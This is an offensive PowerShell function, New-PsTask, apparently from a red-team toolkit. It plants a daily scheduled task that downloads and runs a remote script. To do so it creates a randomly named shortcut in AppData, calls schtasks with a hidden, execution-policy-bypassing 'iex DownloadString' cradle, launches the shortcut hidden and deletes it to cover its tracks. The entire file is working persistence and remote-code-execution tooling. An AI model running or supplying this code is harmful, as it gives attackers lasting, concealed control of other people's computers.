function New-PsTask {
<#

.SYNOPSIS 
 Generates a scheduled task that utilizes Net.Webclient Downloadstring method to a remote PowerShell script.

.PARAMETER Help
 Displays Help

.PARAMETER PsUrl
 URL to a remote powershell script.
 
.PARAMETER PsUrl
 Task Name

.PARAMETER Time
 Execute task at this time. 11:11, etc.

 Author: (@0rbz_)
#>

[CmdletBinding()]
param (

	[Parameter(ParameterSetName = 'Help', Position=1)]
	[Switch]$Help,
	[Parameter()]
	[String]$PSUrl,
	[Parameter()]
	[String]$TaskName,
	[Parameter()]
	[String]$Time
)

$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))

	if ($Help) {
		Write @"
 -----------------------------------------------------------------------------		
 Ex: New-PsTask -PSUrl http://server/script.ps1 -TaskName "Test" -Time "00:01"
 -----------------------------------------------------------------------------
 
"@
	}
	elseif ($PsUrl -and $TaskName -and $Time) {
		Try {
			$Wss = New-Object -ComObject WScript.Shell
			$LnkCr = $Wss.CreateShortcut("$env:appdata\$Rs1.lnk")
			$LnkCr.TargetPath = "C:\Windows\System32\schtasks.exe"
			$LnkCr.Arguments = "/Create /F /TN $TaskName /SC DAILY /ST $Time /TR ""powershell -ep Bypass -nop -w 1 \""iex ((New-Object Net.WebClient).DownloadString(\\\""'$PSUrl\\\""))\"""
			$LnkCr.Save()
			Start-Process -Wi Hidden -Fi "$env:appdata\$Rs1.lnk"
			Remove-Item "$env:appdata\$Rs1.lnk"
			Write " [+] Success."
		}
		Catch {
			Write " [!] Unknown Error."
		}
	}
}
